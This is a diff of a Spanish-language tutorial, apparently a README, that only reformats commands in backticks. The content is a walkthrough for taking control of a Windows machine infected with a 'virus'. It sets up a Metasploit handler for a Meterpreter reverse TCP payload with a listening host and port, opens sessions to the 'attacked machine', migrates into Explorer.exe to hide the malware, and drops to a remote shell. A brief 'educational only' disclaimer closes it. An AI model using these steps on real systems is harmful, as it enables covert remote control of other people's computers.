@@ -24,20 +24,20 @@ msfconsole
 
 Dentro de Metasploit, configura el handler para el payload:
 `use multi/handler`
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.116
-set LPORT 9999
-exploit -j
+`set PAYLOAD windows/meterpreter/reverse_tcp`
+`set LHOST 192.168.1.116`
+`set LPORT 9999`
+`exploit -j`
 
 # Explotación y Control Remoto
-Una vez que el virus se ejecute en una máquina Windows, podrás controlarla remotamente. Usa el comando 'sessions -i' para ver las sesiones activas y conectarte a la máquina atacada:
-'sessions -i 1'
+Una vez que el virus se ejecute en una máquina Windows, podrás controlarla remotamente. Usa el comando `sessions -i` para ver las sesiones activas y conectarte a la máquina atacada:
+`sessions -i 1`
 
-Con esto, tendrás acceso a los procesos de la máquina infectada. Puedes ocultar el virus fusionándolo con otro proceso como 'Explorer.exe' usando el comando 'migrate'.
+Con esto, tendrás acceso a los procesos de la máquina infectada. Puedes ocultar el virus fusionándolo con otro proceso como `Explorer.exe` usando el comando `migrate`.
 
 # Obtención de la Shell Remota
 Para interactuar directamente con la máquina infectada:
-'shell'
+`shell`
 
 Advertencia
 Este tutorial es meramente educativo. Crear y distribuir virus es una actividad ilegal en muchas jurisdicciones. Este conocimiento debe usarse solo en entornos controlados y con fines educativos.
